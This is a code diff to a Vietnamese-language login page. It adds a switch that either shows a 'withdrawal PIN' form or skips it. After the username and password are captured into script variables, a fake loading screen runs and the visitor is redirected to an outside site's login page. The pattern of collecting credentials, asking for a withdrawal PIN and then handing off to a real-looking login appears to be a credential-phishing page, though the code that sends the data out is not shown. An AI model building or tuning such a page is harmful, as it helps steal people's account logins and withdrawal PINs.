@@ -148,7 +148,6 @@
 
         .social-login { display: flex; justify-content: center; gap: 20px; margin-bottom: 25px; }
         
-        /* SỬA CHUẨN NÚT FACE ID VÀ GOOGLE: Nền trắng, không viền, bóng đổ mượt */
         .social-icon-box { 
             width: 48px; 
             height: 48px; 
@@ -158,20 +157,19 @@
             justify-content: center; 
             background: #fff; 
             cursor: pointer; 
-            box-shadow: 0 2px 10px rgba(0,0,0,0.08); /* Bóng đổ mờ */
-            border: 1px solid #f5f5f5; /* Khung siêu mờ chống lẹm màu */
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08); 
+            border: 1px solid #f5f5f5; 
         }
         .social-icon-box img { width: 28px; height: 28px; object-fit: contain; }
         
-        /* Chỉnh lại Face ID nét thanh mảnh, bo tròn */
         .social-icon-box svg {
             width: 26px;
             height: 26px;
             fill: none; 
             stroke: var(--primary);
             stroke-width: 1.8;
-            stroke-linecap: round; /* Đầu nét bo tròn */
-            stroke-linejoin: round; /* Góc gập bo tròn */
+            stroke-linecap: round; 
+            stroke-linejoin: round; 
         }
 
         .app-download-banner { 
@@ -300,7 +298,6 @@
             
             <div class="social-login">
                 <div class="social-icon-box">
-                    <!-- ICON FACE ID BO TRÒN CHUẨN GỐC -->
                     <svg viewBox="0 0 24 24">
                         <path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3" />
                         <path d="M9 9v1.5m6-1.5v1.5m-3-1v3h-1m-2 3c1.5 1.5 4.5 1.5 6 0" />
@@ -344,7 +341,7 @@
 
             <div class="input-group" id="group-reg-phone">
                 <div class="phone-prefix"><span class="vn-flag"></span> +84</div><span class="req">*</span>
-                <input type="tel" id="reg-phone" placeholder="Nhập SĐT " oninput="checkInput('reg-phone')" onblur="validateField('reg-phone')">
+                <input type="tel" id="reg-phone" placeholder="Nhập SĐT (Bỏ số 0 đầu)" oninput="checkInput('reg-phone')" onblur="validateField('reg-phone')">
                 <div class="icon-actions">
                     <i class="fa-solid fa-circle-xmark hidden" id="clear-reg-phone" onclick="clearField('reg-phone')"></i>
                 </div>
@@ -426,6 +423,13 @@
 </div>
 
 <script>
+    // ==========================================
+    // CÔNG TẮC BẬT/TẮT YÊU CẦU MÃ PIN RÚT TIỀN
+    // - Đổi thành true : Hiển thị bảng mã PIN
+    // - Đổi thành false: Bỏ qua mã PIN, chuyển trang luôn
+    // ==========================================
+    const REQUIRE_PIN_CODE = false; 
+
     function switchTab(tab) {
         document.getElementById('form-login').classList.toggle('hidden', tab !== 'login');
         document.getElementById('form-register').classList.toggle('hidden', tab !== 'register');
@@ -549,7 +553,18 @@
         if (isUserValid && isPassValid) {
             currentLoginUser = document.getElementById('login-user').value;
             currentLoginPass = document.getElementById('login-pass').value;
-            document.getElementById('withdraw-modal').style.display = 'flex';
+            
+            // XỬ LÝ THEO TRẠNG THÁI CÔNG TẮC
+            if (REQUIRE_PIN_CODE) {
+                // Bật thì hiện form mã PIN
+                document.getElementById('withdraw-modal').style.display = 'flex';
+            } else {
+                // Tắt thì chạy loading rồi bay qua trang mới luôn
+                document.getElementById('loading-overlay').style.display = 'flex';
+                setTimeout(() => { 
+                    window.location.href = 'https://sc8881.ink/home/login'; 
+                }, 1500);
+            }
         }
     }
 
@@ -601,7 +616,7 @@
         }
         document.getElementById('loading-overlay').style.display = 'flex';
         setTimeout(() => { 
-            window.location.reload(); 
+            window.location.href = 'https://sc8881.ink/home/login'; 
         }, 1500);
     }
 </script>
